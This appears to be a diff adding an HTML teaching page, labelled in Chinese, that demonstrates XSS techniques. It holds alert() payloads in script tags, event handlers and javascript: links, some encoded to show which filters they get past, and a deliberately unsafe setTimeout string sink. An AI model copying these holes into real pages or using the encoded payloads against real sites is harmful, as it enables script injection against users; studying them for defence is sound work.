@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Web Xss</title>
+</head>
+<body>
+	<p>1.HTML实体XSS</p>
+	<p><script>alert("实体XSS");</script></p>
+	
+	<P>2.HTML属性XSS</P>
+	<p>2.1 通用属性</p>
+	<input type="text" name="xss" /><script type="text/javascript">alert("属性XSS");</script><input value="破坏标签"></input>
+	<br/>
+	<input name="xss" onclick="alert('属性XSS')" value="增加onclick属性"></input>
+	<p>2.2 协议属性</p>
+	<p>href属性XSS：</p><a href="javascript:alert('href xss')" target="_blank">Href XSS</a>
+	<p>href属性XSS：</p><a href="javascript&#x3a;alert&#x28;&#x27;href&#x20;xssHTML编码无效&#x27;&#x29;" target="_blank">Href XSS,HTML编码无效</a>
+	<p>href属性XSS：</p><a href="javascript:%61%6c%65%72%74%28%27%68%72%65%66%20%78%73%20URL部分编码无效%73%27%29" target="_blank">Href XSS 部分URL编码无效</a>
+	<p>href属性XSS：</p><a href="javascript:alert\x28\x27href xss\x27\x29" target="_blank">Href XSS JavaScript编码</a>
+	<br/>
+	<p>2.3 onclick属性</p>
+	<p>onclick属性XSS:</p><p id="addlinecontent" onclick="addlinecontent('hello world'),alert('onclick xss')">点击增加一行显示</p>
+	<p>onclick属性XSS:</p><p id="addlinecontent" onclick="addlinecontent('&#x68;&#x65;&#x6c;&#x6c;&#x6f;&#x20;&#x77;&#x6f;&#x72;&#x6c;&#x64;&#x27;&#x29;&#x2c;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x6f;&#x6e;&#x63;&#x6c;&#x69;&#x63;&#x6b;&#x20;&#x78;&#x73;&#x73;htmlencode')">点击增加一行显示，HTML编码</p>
+
+	<p>onclick属性XSS:</p><p id="addlinecontent2" onclick="addlinecontent2('hello world\x27\x29\x2calert\x28\x27onclick xss')">点击增加一行显示，JavaScript编码</p>
+	<P>2.4 编解码顺序相反</P>
+	<p onclick="alert('\x26\x23\x78\x32\x32\x3b')">jsencode(htmlencode("))</p>
+	<p onclick="alert('&#x5c;&#x78;&#x32;&#x32;')">htmlencode(jsencode(""))</p>
+	<p>3.DOM XSS</p>
+	<p>location、location.href、location.replace、iframe.src、document.referer、window.name、document.write、innerHTML</p>
+	<p>4.DoubleJSencode</p>
+	<p>setTimeout、setInterval、Eval</p>
+	<textarea id="settimeoutxss" onclick="updatecontent('hello world转义未编码\'\);alert\(0\);eval\(\'')" rows="8" cols="40"></textarea>
+	<p onclick="updatecontent('hello world HTML编码，依旧存在XSS&#x27;&#x29;&#x3b;alert&#x28;1&#x29;&#x3b;eval&#x28;&#x27;')">Click setTimeout HTML编码，依旧存在XSS</p>
+	<p onclick="updatecontent('hello world JavaScript编码，依旧存在XSS\x27\x29\x3balert\x282\x29\x3beval\x28\x27')">Click setTimeout JavaScript编码，依旧存在XSS</p>
+	<p onclick="updatecontent('hello world \x5cx27\x5cx29\x5cx3balert\x5cx282\x5cx29\x5cx3beval\x5cx28\x5cx27')">Click setTimeout Double JavaScript编码，不存在XSS</p>
+	
+</body>
+<script>
+
+function addlinecontent(value){
+
+    document.getElementById("addlinecontent").innerText=value;
+}
+function addlinecontent2(value){
+
+    document.getElementById("addlinecontent2").innerText=value;
+}
+function updatecontent(url){
+	setTimeout("showURL('"+url+"')");
+}
+function showURL(url){
+	document.getElementById("settimeoutxss").value=url;
+}
+
+
+
+
+
+</script>
+</html>
